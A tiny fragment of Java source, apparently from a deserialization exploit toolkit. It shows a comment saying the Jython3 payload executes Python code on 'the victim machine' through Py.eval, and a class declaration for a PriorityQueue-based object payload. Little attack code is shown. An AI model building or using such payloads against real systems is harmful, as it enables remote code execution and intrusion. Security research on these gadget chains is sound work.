 ...
 *
 * This version of Jython3 executes python2 code on the victim machine. Note that we are in a Py.eval here
...
public class Jython3 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
